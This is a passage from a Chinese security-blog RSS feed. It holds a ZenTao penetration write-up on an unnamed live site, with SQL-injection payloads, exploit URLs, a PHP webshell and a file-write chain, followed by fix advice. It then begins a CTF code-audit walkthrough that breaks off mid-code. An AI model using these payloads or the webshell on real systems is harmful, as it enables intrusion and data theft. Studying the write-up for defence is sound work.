&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c9c286b86cab690e0da2551d738fc1d1_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;作者：&lt;/b&gt; &lt;a class=&quot;member_mention&quot; href=&quot;https://www.zhihu.com/people/03f40f07ca96c5b31c8892400eec8c1d&quot; data-hash=&quot;03f40f07ca96c5b31c8892400eec8c1d&quot; data-hovercard=&quot;p$b$03f40f07ca96c5b31c8892400eec8c1d&quot;&gt;@L3m0n&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;此过程为某站点的渗透记录，过程一波三折，但归根结底都是粗心大意造成的，不过自我认为在这个排坑的过程中也学习到了很多。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;确认版本&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;首先可以通过接口来确认一下当前禅道的版本。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://example.com/index.php?mode=getconfig&lt;/code&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c6d7fb7d4b2d437eb33d3644630813b4_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1582&quot;&gt;&lt;h2&gt;&lt;b&gt;SQL注入分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;网上之前有过一个&lt;code class=&quot;inline&quot;&gt;9.1.2&lt;/code&gt;的&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数的分析，但是没想到&lt;code class=&quot;inline&quot;&gt;9.2.1&lt;/code&gt;也存在此问题，(&lt;code class=&quot;inline&quot;&gt;2018.3.2&lt;/code&gt;号看到目前最新版本是&lt;code class=&quot;inline&quot;&gt;9.8.1&lt;/code&gt;)。&lt;/p&gt;&lt;p&gt;出问题的地方是此文件的&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数：\lib\base\dao\dao.class.php&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;public function orderBy($order)
{
    if($this-&amp;gt;inCondition and !$this-&amp;gt;conditionIsTrue) return $this;

    $order = str_replace(array(&#39;|&#39;, &#39;&#39;, &#39;_&#39;), &#39; &#39;, $order);

    /* Add &quot;`&quot; in order string. */
    /* When order has limit string. */
    $pos    = stripos($order, &#39;limit&#39;);
    $orders = $pos ? substr($order, 0, $pos) : $order;
    $limit  = $pos ? substr($order, $pos) : &#39;&#39;;
    $orders = trim($orders);
    if(empty($orders)) return $this;
    if(!preg_match(&#39;/^(\w+\.)?(`\w+`|\w+)( +(desc|asc))?( *(, *(\w+\.)?(`\w+`|\w+)( +(desc|asc))?)?)*$/i&#39;, $orders)) die(&quot;Order is bad request, The order is $orders&quot;);

    $orders = explode(&#39;,&#39;, $orders);
    foreach($orders as $i =&amp;gt; $order)
    {
        $orderParse = explode(&#39; &#39;, trim($order));
        foreach($orderParse as $key =&amp;gt; $value)
        {
            $value = trim($value);
            if(empty($value) or strtolower($value) == &#39;desc&#39; or strtolower($value) == &#39;asc&#39;) continue;

            $field = $value;
            /* such as t1.id field. */
            if(strpos($value, &#39;.&#39;) !== false) list($table, $field) = explode(&#39;.&#39;, $field);
            if(strpos($field, &#39;`&#39;) === false) $field = &quot;`$field`&quot;;

            $orderParse[$key] = isset($table) ? $table . &#39;.&#39; . $field :  $field;
            unset($table);
        }
        $orders[$i] = join(&#39; &#39;, $orderParse);
        if(empty($orders[$i])) unset($orders[$i]);
    }
    $order = join(&#39;,&#39;, $orders) . &#39; &#39; . $limit;

    $this-&amp;gt;sql .= &#39; &#39; . DAO::ORDERBY . &quot; $order&quot;;
    return $this;
}&lt;/code&gt;&lt;p&gt;对于&lt;code class=&quot;inline&quot;&gt;limit&lt;/code&gt;后未做严格的过滤与判断，然后拼接到了&lt;code class=&quot;inline&quot;&gt;order by&lt;/code&gt;后面导致产生注入.&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$order = join(&#39;,&#39;, $orders) . &#39; &#39; . $limit;&lt;/code&gt;&lt;p&gt;看了一下&lt;code class=&quot;inline&quot;&gt;9.8.1&lt;/code&gt;的修补是对limit进行正则限制，但是事实上感觉此处正则是写了一个bug，比如正常调用&lt;code class=&quot;inline&quot;&gt;orderBy($order)&lt;/code&gt;的时候，其中&lt;code class=&quot;inline&quot;&gt;$order&lt;/code&gt;为&lt;code class=&quot;inline&quot;&gt;abc desc limit 1,1&lt;/code&gt;的时候，进入&lt;code class=&quot;inline&quot;&gt;$limit&lt;/code&gt;则是&lt;code class=&quot;inline&quot;&gt;limit 1,1&lt;/code&gt;，导致匹配失败。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;/* Add &quot;`&quot; in order string. */
/* When order has limit string. */
$pos    = stripos($order, &#39;limit&#39;);
$orders = $pos ? substr($order, 0, $pos) : $order;
$limit  = $pos ? substr($order, $pos) : &#39;&#39;;
if($limit and !preg_match(&#39;/^[0-9]+ *(, *[0-9]+)?$/&#39;, $limit)) $limit = &#39;&#39;;&lt;/code&gt;&lt;p&gt;如果想要造成前台注入（无需登录）的话，就得先看看禅道开放了哪些接口，看是否有调用&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数。&lt;/p&gt;&lt;p&gt;\zentao\module\common\model.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;public function isOpenMethod($module, $method)
{
   if($module == &#39;user&#39; and strpos(&#39;login|logout|deny|reset&#39;, $method) !== false) return true;
   if($module == &#39;api&#39;  and $method == &#39;getsessionid&#39;) return true;
   if($module == &#39;misc&#39; and $method == &#39;ping&#39;)  return true;
   if($module == &#39;misc&#39; and $method == &#39;checktable&#39;) return true;
   if($module == &#39;misc&#39; and $method == &#39;qrcode&#39;) return true;
   if($module == &#39;misc&#39; and $method == &#39;about&#39;) return true;
   if($module == &#39;misc&#39; and $method == &#39;checkupdate&#39;) return true;
   if($module == &#39;misc&#39; and $method == &#39;changelog&#39;) return true;
   if($module == &#39;sso&#39; and $method == &#39;login&#39;)  return true;
   if($module == &#39;sso&#39; and $method == &#39;logout&#39;) return true;
   if($module == &#39;sso&#39; and $method == &#39;bind&#39;) return true;
   if($module == &#39;sso&#39; and $method == &#39;gettodolist&#39;) return true;
   if($module == &#39;block&#39; and $method == &#39;main&#39;) return true;

   if($this-&amp;gt;loadModel(&#39;user&#39;)-&amp;gt;isLogon() or ($this-&amp;gt;app-&amp;gt;company-&amp;gt;guest and $this-&amp;gt;app-&amp;gt;user-&amp;gt;account == &#39;guest&#39;))
   {
       if(stripos($method, &#39;ajax&#39;) !== false) return true;
       if(stripos($method, &#39;downnotify&#39;) !== false) return true;
       if($module == &#39;tutorial&#39;) return true;
       if($module == &#39;block&#39;) return true;
       if($module == &#39;product&#39; and $method == &#39;showerrornone&#39;) return true;
   }
   return false;
}&lt;/code&gt;&lt;p&gt;其中的&lt;code class=&quot;inline&quot;&gt;if($module == &#39;block&#39; and $method == &#39;main&#39;) return true;&lt;/code&gt;，也就是本次漏洞的主角，继续跟进。&lt;/p&gt;&lt;p&gt;\zentao\module\block\control.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;class block extends control
{
    public function __construct($moduleName = &#39;&#39;, $methodName = &#39;&#39;)
    {
        parent::__construct($moduleName, $methodName);
        $this-&amp;gt;selfCall = strpos($this-&amp;gt;server-&amp;gt;http_referer, common::getSysURL()) === 0 || $this-&amp;gt;session-&amp;gt;blockModule;
        if($this-&amp;gt;methodName != &#39;admin&#39; and $this-&amp;gt;methodName != &#39;dashboard&#39; and !$this-&amp;gt;selfCall and !$this-&amp;gt;loadModel(&#39;sso&#39;)-&amp;gt;checkKey()) die(&#39;&#39;);
    }
    public function main($module = &#39;&#39;, $id = 0)
    {
        ...
       $mode = strtolower($this-&amp;gt;get-&amp;gt;mode);
       if($mode == &#39;getblocklist&#39;)
       {   
           ...
       }   
       elseif($mode == &#39;getblockform&#39;)
       {   
           ...
       }   
       elseif($mode == &#39;getblockdata&#39;)
       {
           $code = strtolower($this-&amp;gt;get-&amp;gt;blockid);
    
           $params = $this-&amp;gt;get-&amp;gt;param;
           $params = json_decode(base64_decode($params));
            ....
           $this-&amp;gt;viewType    = (isset($params-&amp;gt;viewType) and $params-&amp;gt;viewType == &#39;json&#39;) ? &#39;json&#39; : &#39;html&#39;;
           $this-&amp;gt;params      = $params;
           $this-&amp;gt;view-&amp;gt;code  = $this-&amp;gt;get-&amp;gt;blockid;
           $this-&amp;gt;view-&amp;gt;title = $this-&amp;gt;get-&amp;gt;blockTitle;
    
           $func = &#39;print&#39; . ucfirst($code) . &#39;Block&#39;;
           if(method_exists(&#39;block&#39;, $func))
           {
               $this-&amp;gt;$func($module);
           }
           else
           {
               $this-&amp;gt;view-&amp;gt;data = $this-&amp;gt;block-&amp;gt;$func($module, $params);
           }
       }
    }
}&lt;/code&gt;&lt;p&gt;首先看&lt;code class=&quot;inline&quot;&gt;__construct&lt;/code&gt;中，&lt;code class=&quot;inline&quot;&gt;$this-&amp;gt;selfCall&lt;/code&gt;是在验证&lt;code class=&quot;inline&quot;&gt;referer&lt;/code&gt;的值，如果为真的话则后面的&lt;code class=&quot;inline&quot;&gt;if&lt;/code&gt;将不会进入&lt;code class=&quot;inline&quot;&gt;die&lt;/code&gt;语句里面&lt;/p&gt;&lt;p&gt;接下来跟进&lt;code class=&quot;inline&quot;&gt;main&lt;/code&gt;函数，可以看到最后的&lt;code class=&quot;inline&quot;&gt;$func = &#39;print&#39; . ucfirst($code) . &#39;Block&#39;;&lt;/code&gt;，会对一些函数进行调用，与此同时，我们搜索&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;的调用的时候可以发现&lt;code class=&quot;inline&quot;&gt;printCaseBlock&lt;/code&gt;函数的存在&lt;/p&gt;&lt;p&gt;\zentao\module\block\control.php&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-dc18e0f1b6d8b747c6ec554acae5d139_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2246&quot;&gt;&lt;p&gt;所以前台注入的整个过程便比较清晰了，那么如何利用?&lt;/p&gt;&lt;h2&gt;&lt;b&gt;SQL注入利用&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;回过头来，因为禅道有windows直接的一键化安装程序，其数据库使用的也是&lt;code class=&quot;inline&quot;&gt;root&lt;/code&gt;权限，导致可直接导出shell，但是如果没有这么高权限的时候，对于这个注入应该如何出数据。&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;sql = &#39;select user()&#39;
param = &#39;{&quot;orderBy&quot;:&quot;order limit 1;select (if(ord(mid((%s),%d,1))=%d,sleep(2),1))--&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&#39; % (sql,n,i) ,1))--&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&#39; % (sql,n,i) &lt;/code&gt;&lt;p&gt;禅道是支持多语句的，这也为后面的利用提供方便。&lt;/p&gt;&lt;p&gt;注入出数据库名和表段名后，当我想继续注入出用户账号密码的时候，意外地发现没有出数据。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;sql = &#39;select 12345 from zt_user&#39;&lt;/code&gt;&lt;p&gt;还是没有出数据，猜测是管理员改了表前缀，所以想去通过&lt;code class=&quot;inline&quot;&gt;information_schema&lt;/code&gt;查询一下表名，但是意外地发现，也不能读取？难道被删了？但是我还是想知道一下表前缀。&lt;/p&gt;&lt;p&gt;请求的时候加了一个单引号，并且加上referer，看一下报错信息。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://example.com/index.php?m=block&amp;amp;f=main&amp;amp;mode=getblockdata&amp;amp;blockid=case&amp;amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxJyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0=

其中param经过BASE64解码得到
{&quot;orderBy&quot;:&quot;order limit 1,1&#39;&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-2b635f910bb80ada4553155d1c748f29_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2710&quot;&gt;&lt;p&gt;因为PDO的关系，SQL中的表名是&lt;code class=&quot;inline&quot;&gt;%s&lt;/code&gt;替代的，所以未能够得到库名。&lt;/p&gt;&lt;p&gt;那么就利用报错去得到当前SQl语句里面查询的表名，比如利用&lt;code class=&quot;inline&quot;&gt;polygon&lt;/code&gt;函数。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-adbcf88a750df6340c76cb8c7da63235_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2696&quot;&gt;&lt;p&gt;此注入点可以理解为limit后的注入点，因为使用多语句的话，报错效果不明显，所以就直接在limit后面进行注入。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://example.com/index.php?m=block&amp;amp;f=main&amp;amp;mode=getblockdata&amp;amp;blockid=case&amp;amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKHBvbHlnb24oaWQpLDEpIyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0=

param base64解码
{&quot;orderBy&quot;:&quot;order limit 1,1 PROCEDURE ANALYSE(polygon(id),1)#&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-56760516eb1da1fa547b876b9838bd67_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2544&quot;&gt;&lt;p&gt;上图为本地测试，但是limit的注入和mysql版本还有一些关系，目前网上的payload仅限于低版本才可报错注入出数据，很不幸运的是，目标使用的是高版本mysql。&lt;/p&gt;&lt;p&gt;那既然可以多语句，在不能用&lt;code class=&quot;inline&quot;&gt;information_schema&lt;/code&gt;的情况下，可以通过下面语法来进行盲注：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;show table status where name = &#39;xxx&#39; and sleep(2)&lt;/code&gt;&lt;p&gt;写到py里面的payload是这样的&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;sql = &quot;show table status where hex(substr(name,1,8))=&#39;7a745f75736572%s&#39; and sleep(2)&quot; % binascii.b2a_hex(chr(i))
param = &#39;{&quot;orderBy&quot;:&quot;order limit 1,1;%s--&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}&#39; % sql&lt;/code&gt;&lt;p&gt;经过一番折腾发现，表前缀就是默认的&lt;code class=&quot;inline&quot;&gt;zt_&lt;/code&gt;，但是为啥又不能够读取到用户数据呢?&lt;/p&gt;&lt;p&gt;仔细看到禅道里面的&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数，发现做了过滤。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$order = str_replace(array(&#39;|&#39;, &#39;&#39;, &#39;_&#39;), &#39; &#39;, $order);&lt;/code&gt;&lt;p&gt;把下划线给过滤掉了，那这种在多语句下，可以利用mysql的预查询来绕过，值得注意的是，这个版本语法大小写敏感。&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;SET @SQL=0x494E5345525420494E544F206D6F76696520286E616D652C20636F6E74656E74292056414C55455320282761616161272C27616161612729;PREPARE pord FROM @SQL;EXECUTE pord;SET @SQL=0x494E5345525420494E544F206D6F76696520286E616D652C20636F6E74656E74292056414C55455320282761616161272C27616161612729;PREPARE pord FROM @SQL;EXECUTE pord;&lt;/code&gt;&lt;p&gt;注入出admin密码的时候，惊喜地发现不能解开，无奈之下，只能先拿到一个普通账号。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Getshell&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;禅道在防止getshell方面还花了一点心思，曾经挖到一个可以任意写文件getshell（最新版本还存在这段代码），不过需要的权限是管理员权限。&lt;/p&gt;&lt;p&gt;看了一下禅道里面人员组织架构情况，有研发、项目经理、产品经理，高层管理，系统管理员等角色，其中系统管理员虽然密码解不开，但是我们可以去解密一下高层管理的密码，因为这个角色的权限是可以修改某用户的用户组权限。在高层管理账号中，我们可以将一个普通账号修改为管理员。&lt;/p&gt;&lt;p&gt;接下来就是写文件Getshell：&lt;/p&gt;&lt;p&gt;/xampp/zentaopro/module/api/control.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;public function getModel($moduleName, $methodName, $params = &#39;&#39;)
{
    parse_str(str_replace(&#39;,&#39;, &#39;&amp;amp;&#39;, $params), $params);
    $module = $this-&amp;gt;loadModel($moduleName);
    
    $result = call_user_func_array(array(&amp;amp;$module, $methodName), $params);
    if(dao::isError()) die(json_encode(dao::getError()));
    $output[&#39;status&#39;] = $result ? &#39;success&#39; : &#39;fail&#39;;
    $output[&#39;data&#39;]   = json_encode($result);
    $output[&#39;md5&#39;]    = md5($output[&#39;data&#39;]);
    $this-&amp;gt;output     = json_encode($output);
    die($this-&amp;gt;output);
}&lt;/code&gt;&lt;p&gt;可以看到是进入了call_user_func_array，也就是我们可以任意实例化一个module方法，方法的参数也是可控的，可以通过&lt;code class=&quot;inline&quot;&gt;,&lt;/code&gt;来分割参数。&lt;/p&gt;&lt;p&gt;/zentaopro/module/editor/model.php&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;public function save($filePath)
{
    $fileContent = $this-&amp;gt;post-&amp;gt;fileContent;
    $evils       = array(&#39;eval&#39;, &#39;exec&#39;, &#39;passthru&#39;, &#39;proc_open&#39;, &#39;shell_exec&#39;, &#39;system&#39;, &#39;$$&#39;, &#39;include&#39;, &#39;require&#39;, &#39;assert&#39;);
    $gibbedEvils = array(&#39;e v a l&#39;, &#39;e x e c&#39;, &#39; p a s s t h r u&#39;, &#39; p r o c _ o p e n&#39;, &#39;s h e l l _ e x e c&#39;, &#39;s y s t e m&#39;, &#39;$ $&#39;, &#39;i n c l u d e&#39;, &#39;r e q u i r e&#39;, &#39;a s s e r t&#39;);
    $fileContent = str_ireplace($gibbedEvils, $evils, $fileContent);
    if(get_magic_quotes_gpc()) $fileContent = stripslashes($fileContent);

    $dirPath = dirname($filePath);
    $extFilePath = substr($filePath, 0, strpos($filePath, DS . &#39;ext&#39; . DS) + 4);
    if(!is_dir($dirPath) and is_writable($extFilePath)) mkdir($dirPath, 0777, true);
    if(is_writable($dirPath))
    {
        file_put_contents($filePath, $fileContent);
    }
    else
    {
        die(js::alert($this-&amp;gt;lang-&amp;gt;editor-&amp;gt;notWritable . $extFilePath));
    }
}&lt;/code&gt;&lt;p&gt;在editor中是可以写一个文件的，filePath可控，fileContent也是可控的，这下就是可以任意写一个文件。&lt;/p&gt;&lt;p&gt;Exp:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://example.com/?m=api&amp;amp;f=getModel&amp;amp;moduleName=editor&amp;amp;methodName=save&amp;amp;params=filePath=aaaaaa.php

POST内容:
fileContent=&amp;lt;?php $_POST[1]($_POST[2]);

最后的shell地址是\zentaopro\module\api\aaaaaa.php&lt;/code&gt;&lt;p&gt;但是问题又来了，前面报错里面得到的路径目录感觉像是做了权限（这里绕弯了，路径少加了一个www，所以以为是没权限写），最终从数据库中的&lt;code class=&quot;inline&quot;&gt;zt_file&lt;/code&gt;获取上传文件的路径，然后再将shell写入当中才得以结束。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;对于&lt;code class=&quot;inline&quot;&gt;order by&lt;/code&gt;的漏洞如何进行防御的时候，我觉得上面代码在部分上有可取之处。&lt;/p&gt;&lt;p&gt;1、去掉&lt;code class=&quot;inline&quot;&gt;limit&lt;/code&gt;部分，然后限制格式&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;if(!preg_match(&#39;/^(\w+\.)?(`\w+`|\w+)( +(desc|asc))?( *(, *(\w+\.)?(`\w+`|\w+)( +(desc|asc))?)?)*$/i&#39;, $orders)) die(&quot;Order is bad request, The order is $orders&quot;);&lt;/code&gt;&lt;p&gt;2、然后循环对每个字段进行反引号的添加&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$orders = explode(&#39;,&#39;, $orders);
foreach ($orders as $i =&amp;gt; $order) {
	$orderParse = explode(&#39; &#39;, trim($order));
	foreach ($orderParse as $key =&amp;gt; $value) {
		$value = trim($value);
		if (empty($value) or strtolower($value) == &#39;desc&#39; or strtolower($value) == &#39;asc&#39;) {
			continue;
		}

		$field = $value;
		/* such as t1.id field. */
		if (strpos($value, &#39;.&#39;) !== false) {
			list($table, $field) = explode(&#39;.&#39;, $field);
		}

		if (strpos($field, &#39;`&#39;) === false) {
			$field = &quot;`$field`&quot;;
		}

		$orderParse[$key] = isset($table) ? $table . &#39;.&#39; . $field : $field;
		unset($table);
	}
	$orders[$i] = join(&#39; &#39;, $orderParse);
	if (empty($orders[$i])) {
		unset($orders[$i]);
	}

}&lt;/code&gt;&lt;p&gt;整个过程就是自己在挖莫名其妙的坑，然后再一个个慢慢补上，希望能够对大家有用。&lt;/p&gt;</description>
<author>小蘑菇</author>
<guid isPermaLink="false">2018-03-07-34275981</guid>
<pubDate>Wed, 07 Mar 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>攻击LNMP架构Web应用的几个小Tricks</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-02-22-33919193.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/33919193&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-bc88b00f982a8df093427c8b8ea7e535_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hash=&quot;6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hovercard=&quot;p$b$6f8ffd80705c262c2ee3fa4d9b3f8f06&quot;&gt;@周佩雨&lt;/a&gt; &lt;/p&gt;&lt;p&gt;[ Phith0n，现就职于长亭科技，长期关注并笔耕于安全编码、代码审计等方向]&lt;/p&gt;&lt;p&gt;农历新年初一，我在&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html&quot;&gt;代码审计知识星球&lt;/a&gt;分享了一个红包，但领取红包的条件是破解我出的一道代码审计相关题目，题干如下：&lt;/p&gt;&lt;blockquote&gt;&lt;a href=&quot;http://2018.mhz.pw:62231&quot;&gt;2018.mhz.pw:62231&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x01  拉取源码&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;题干比较简单，我们用浏览器打开，发现提示&lt;code class=&quot;inline&quot;&gt;ERR_INVALID_HTTP_RESPONSE&lt;/code&gt;，说明这个端口并非HTTP服务。用nmap进行端口指纹识别：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;nmap -sV -p 62231 2018.mhz.pw&lt;/code&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2fd8d5219cac4c784a0e26ffe4df8048_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;213&quot;&gt;&lt;p&gt;可见，这是一个rsync服务，我们使用rsync命令查看目录，发现只有一个目录，名为&lt;code class=&quot;inline&quot;&gt;pwnhub_6670.git&lt;/code&gt;，将其拉取下来：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-a11e4589088c3480df25b50cac8ca294_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;367&quot;&gt;&lt;p&gt;查看&lt;code class=&quot;inline&quot;&gt;pwnhub_6670.git&lt;/code&gt;目录，发现这是一个git裸仓库（&lt;a href=&quot;http://www.saintsjd.com/2011/01/what-is-a-bare-git-repository/&quot;&gt;git bare repository&lt;/a&gt;）。&lt;/p&gt;&lt;p&gt;Git裸仓库怎么还原呢？其实非常简单，我们平时用的Github、Gitlab上存的所有仓库其实都是裸仓库，比如我们拉取vulhub的源码，执行&lt;code class=&quot;inline&quot;&gt;git clone https://github.com/vulhub/vulhub.git&lt;/code&gt;，其中&lt;code class=&quot;inline&quot;&gt;vulhub.git&lt;/code&gt;其实就是Github服务器上的一个裸仓库。可见，裸仓库一般以”项目名称.git“为名。&lt;/p&gt;&lt;p&gt;Git支持通过本地文件、SSH、HTTPS或GIT协议拉取信息。我们既然已经用rsync将裸仓库下载到本地了，所以只需要&lt;code class=&quot;inline&quot;&gt;git clone pwnhub_6670.git&lt;/code&gt;即可将裸仓库拉取下来，成为一个标准的仓库：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e9119014ab77117e4fdadc453c307251_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;405&quot;&gt;&lt;p&gt;仓库&lt;code class=&quot;inline&quot;&gt;pwnhub_6670&lt;/code&gt;文件夹下的内容就是我们需要审计的源代码。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x02  SQL注入漏洞挖掘&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;作为一个出题人，我耍了点小阳谋。我用了一个叫&lt;a href=&quot;https://github.com/SpeedPHP/speed&quot;&gt;speed&lt;/a&gt;的小众PHP框架，但改了核心文件名为&lt;code class=&quot;inline&quot;&gt;core.php&lt;/code&gt;。就是为了防止大家去找这个框架本身的漏洞导致走偏方向，所有有漏洞的代码都出在我写的代码中。&lt;/p&gt;&lt;p&gt;拿到源码仓库，第一步先看看&lt;code class=&quot;inline&quot;&gt;git log&lt;/code&gt;和branch、tags等信息，也许会暴漏一些目标的敏感信息。这里没有，于是我们就应该把目标放向代码本身。&lt;/p&gt;&lt;p&gt;目标网站&lt;code class=&quot;inline&quot;&gt;http://2018.mhz.pw&lt;/code&gt;只有简单的注册、登录功能，有关输入的代码如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;?php
escape($_REQUEST);
escape($_POST);
escape($_GET);

function escape(&amp;amp;$arg) {
    if(is_array($arg)) {
        foreach ($arg as &amp;amp;$value) {
            escape($value);
        }
    } else {
        $arg = str_replace([&quot;&#39;&quot;, &#39;\\&#39;, &#39;(&#39;, &#39;)&#39;], [&quot;‘&quot;, &#39;\\\\&#39;, &#39;（&#39;, &#39;）&#39;], $arg);
    }
}

function arg($name, $default = null, $trim = false) {
    if (isset($_REQUEST[$name])) {
        $arg = $_REQUEST[$name];
    } elseif (isset($_SERVER[$name])) {
        $arg = $_SERVER[$name];
    } else {
        $arg = $default;
    }
    if($trim) {
        $arg = trim($arg);
    }
    return $arg;
}&lt;/code&gt;&lt;p&gt;escape是将GPR中的单引号、圆括号转换成中文符号，反斜线进行转义；arg是获取用户输入的&lt;code class=&quot;inline&quot;&gt;$_REQUEST&lt;/code&gt;或&lt;code class=&quot;inline&quot;&gt;$_SERVER&lt;/code&gt;。显然，这里&lt;code class=&quot;inline&quot;&gt;$_SERVER&lt;/code&gt;变量没有经过转义，先记下这个点。&lt;/p&gt;&lt;p&gt;全局没其他值得注意的地方了，所以开始看controller的代码。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;?php
function actionRegister(){
    if ($_POST) {
        $username = arg(&#39;username&#39;);
        $password = arg(&#39;password&#39;);

        if (empty($username) || empty($password)) {
            $this-&amp;gt;error(&#39;Username or password is empty.&#39;);
        }

        $email = arg(&#39;email&#39;);
        if (empty($email)) {
            $email = $username . &#39;@&#39; . arg(&#39;HTTP_HOST&#39;);
        }

        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $this-&amp;gt;error(&#39;Email error.&#39;);
        }

        $user = new User();
        $data = $user-&amp;gt;query(&quot;SELECT * FROM `{$user-&amp;gt;table_name}` WHERE `username` = &#39;{$username}&#39;&quot;);
        if ($data) {
            $this-&amp;gt;error(&#39;This username is exists.&#39;);
        }

        $ret = $user-&amp;gt;create([
            &#39;username&#39; =&amp;gt; $username,
            &#39;password&#39; =&amp;gt; md5($password),
            &#39;email&#39; =&amp;gt; $email
        ]);
        if ($ret) {
            $_SESSION[&#39;user_id&#39;] = $user-&amp;gt;lastInsertId();
        } else {
            $this-&amp;gt;error(&#39;Unknown error.&#39;);
        }
    }

